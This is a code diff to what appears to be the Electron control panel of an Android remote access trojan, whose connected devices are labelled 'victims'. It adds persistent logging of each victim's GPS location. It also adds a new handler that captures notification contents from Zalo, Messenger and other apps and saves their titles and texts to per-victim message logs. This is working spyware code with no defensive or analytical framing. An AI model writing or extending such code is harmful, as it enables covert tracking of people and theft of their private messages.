@@ -259,9 +259,31 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
           const lat = data.enable && data.lat != null ? data.lat : null;
           const lng = data.enable && data.lng != null ? data.lng : null;
           victimsList.updateLocation(id, lat, lng, !!data.enable);
+
+          // Log location to file for persistent history
+          const logDir = path.join(__dirname, 'logs', id);
+          fs.ensureDirSync(logDir);
+          const locLog = path.join(logDir, 'locations.log');
+          const time = new Date().toLocaleString();
+          fs.appendFileSync(locLog, `[${time}] Lat: ${lat}, Lng: ${lng}\n`);
+
           if (win && win.webContents)
             win.webContents.send('SocketIO:VictimLocationUpdated', id);
         }
+      });
+
+      // Theo dõi thông báo (Zalo/Messenger): lưu vào file
+      socket.on('notificationUpdate', function (data) {
+        const id = query.id;
+        const logDir = path.join(__dirname, 'logs', id);
+        fs.ensureDirSync(logDir);
+        const msgLog = path.join(logDir, 'messages.log');
+
+        const time = new Date().toLocaleString();
+        const logLine = `[${time}] [${data.package}] ${data.title}: ${data.text}\n`;
+        fs.appendFileSync(msgLog, logLine);
+
+        logToFile(`MSG from ${id}: ${data.title}: ${data.text}`);
       });
 
       //------------------------Notification SCREEN INIT------------------------------------
